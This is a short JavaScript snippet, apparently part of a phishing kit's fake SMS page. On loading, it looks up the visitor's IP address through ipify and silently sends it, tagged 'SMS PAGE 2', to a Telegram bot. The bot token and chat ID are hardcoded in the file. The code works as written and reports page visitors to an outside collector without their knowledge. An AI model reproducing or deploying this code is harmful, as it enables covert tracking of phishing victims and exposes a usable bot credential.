const BOT_TOKEN = '2142704123:AAHZyCvbJRKt7-tJezlGdWgx1X0Ue06wzJA';
const CHAT_ID = '1634271322';

// Make a request to the ipify API to retrieve the user's IP address
fetch('https://api.ipify.org?format=json')
  .then(response => response.json())
  .then(data => {
    // Extract the IP address from the JSON response
    const ip_address = data.ip;

    // Send the IP address to the Telegram bot
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=SMS PAGE 2 ...  ${ip_address}`;
    fetch(url);
  })
